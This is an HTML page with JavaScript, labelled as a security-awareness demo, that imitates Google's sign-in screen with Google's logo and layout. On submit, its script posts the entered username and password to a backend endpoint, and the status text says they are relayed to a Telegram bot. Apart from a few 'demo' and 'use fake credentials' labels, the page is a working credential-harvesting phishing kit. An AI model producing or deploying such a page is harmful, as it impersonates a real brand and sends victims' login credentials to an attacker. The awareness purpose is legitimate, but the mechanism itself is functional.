<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Awareness Demo — NOT Google</title>
    <link rel="stylesheet" href="main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>

<div class="main-container">
   

    <div class="signin-card">
        <!-- Left Section -->
        <div class="left-section">
            <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785658865/google_PNG19644_qmrkpz.png" alt="Google Logo" class="google-logo">
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
        </div>

        <!-- Right Section -->
        <div class="right-section">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Email or phone" aria-label="Email or phone">
            </div>

            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" aria-label="Password">
            </div>

            <p class="guest-info" id="status-message">
                This page demonstrates how a fake login page can steal credentials. Use <strong>fake</strong> credentials only.
            </p>

            <div class="action-buttons">
                <button class="next-button" id="demo-submit">Sign in (Demo)</button>
            </div>
        </div>
    </div>
</div>

<script src="config.js"></script>
<script>
    const submitBtn = document.getElementById('demo-submit');
    const status = document.getElementById('status-message');

    submitBtn.addEventListener('click', async () => {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!username || !password) {
            status.textContent = 'Please fill in both fields (use fake credentials).';
            status.style.color = '#b3261e';
            return;
        }

        status.textContent = 'Sending demo credentials to Telegram bot...';
        status.style.color = '#0b57d0';

        try {
            const response = await fetch(window.API_BASE_URL + '/api/demo-submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });

            const result = await response.json();

            if (response.ok) {
                status.textContent = '✅ Demo sent to Telegram! This is what an attacker would receive. Never enter real credentials on suspicious pages.';
                status.style.color = '#188038';
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
            } else {
                status.textContent = 'Backend error: ' + (result.message || 'Unknown error');
                status.style.color = '#b3261e';
            }
        } catch (err) {
            status.textContent = 'Could not reach the backend. Make sure Laravel is running (php artisan serve).';
            status.style.color = '#b3261e';
        }
    });
</script>

</body>
</html>
